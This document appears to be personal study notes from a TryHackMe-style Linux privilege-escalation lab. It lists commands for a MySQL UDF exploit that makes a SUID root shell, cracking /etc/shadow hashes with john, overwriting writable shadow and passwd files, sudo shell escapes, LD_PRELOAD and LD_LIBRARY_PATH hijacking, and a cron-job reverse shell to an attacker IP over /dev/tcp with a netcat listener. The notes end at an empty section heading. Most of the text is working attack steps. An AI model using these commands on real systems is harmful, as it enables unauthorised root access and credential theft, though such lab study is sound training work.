#first we have to login with ssh credentials 
ssh user@IP
password - password321

#run id command to get user information
id
-----------------------------------------------this MySQL Exploit--------------------------------------
#we will use MySQL service to run system commands as root .
Exploit link is given below
<link - https://www.exploit-db.com/exploits/1518 >

#we will compile the exploit
gcc -g -c exploit.c -udf //here are some changes that replace -udf with -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

#Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

#Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

#Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

/tmp/rootbash -p

#Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!
//this is for just for the procedure no need in real life
rm /tmp/rootbash
exit

-------------------------------------------------Reading shadow file------------------------------
# to check whether file is readable by the user or not
ls -l /etc/shadow

#capture the root password between first : and second :
#and save it in my own file named tmp.txt now decrpyt it using john

john --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/Documents/tryhackme/tmp.txt


--------------------------------------writable shadow file-----------------------------------
#to check file permission
ls -l /etc/shadow

#Generate a new password with a password of choice

mkpasswd -m sha-512 newpasswordhere

#and replace root hash with new generated hash that way we will get root access with our password

----------------------------------------writable passwd file-----------------------------------------
#The /etc/passwd file contains information about user accounts
#checking permission of the file passwd
ls -l /etc/passwd

#Generate a new password hash with a password of your choice:

openssl passwd newpasswordhere


#edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

#Switch to the root user, using the new password:
su root


#Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").
#Now switch to the newroot user, using the new password:
su newroot

---------------------------sudo - shell escape sequece------------------------------------

#type 
sudo -l

#this will give all programs which user can run as root this way we can exploit that program to get root


we will use GTFObin for exploit

Here are various ways the sudo permission of these programs can be abused:

    sudo iftop ====> then ====> !/bin/bash
    sudo find /home -exec /bin/bash \;
    sudo nano ====> then ====> ^R^X ====> reset; sh 1>&0 2>&0
    sudo vim -c '!sh'
    sudo man man ====> then ====> !/bin/bash
    sudo awk 'BEGIN {system("/bin/sh")}'
    sudo less /etc/hosts ====> then ====> !/bin/bash
    sudo ftp ====> then ====> !/bin/bash
    echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
    TERM= sudo more /etc/profile ====> the ====> !/bin/sh


#for apache server we are not provided with exploit in GTFObins so we will use this
sudo apache -f /etc/shadow

----------------------------------


---------------------------------------Sudo Environment Variable------------------------------

Sudo can be configured to inherit certain environment variables from the user's environment.

Check which environment variables are inherited (look for the env_keep options):

#sudo -l

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c:

#gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c

Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:

#sudo LD_PRELOAD=/tmp/preload.so program-name-here

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run ldd(list dynamic dependencies) against the apache2 program file to see which shared libraries are used by the program:

#ldd /usr/sbin/apache2

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:

#gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

#sudo LD_LIBRARY_PATH=/tmp apache2

A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.


----------------------------------- Cron jobs File Permission ------------------------------------------------

View the contents of the system-wide crontab:

#cat /etc/crontab

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

View the contents of the system-wide crontab:

#cat /etc/crontab

There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

Locate the full path of the overwrite.sh file:

#locate overwrite.sh

Note that the file is world-writable:

#ls -l /usr/local/bin/overwrite.sh
<here anyone can write its content so we will write in to it>
Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
--------------------------
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1     //here instead of 10.10.10.10 write your own IP
-----------------------------
Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

#nc -nvlp 4444


---------------------------------- Cron Jobs PATH Environment variable ------------------------






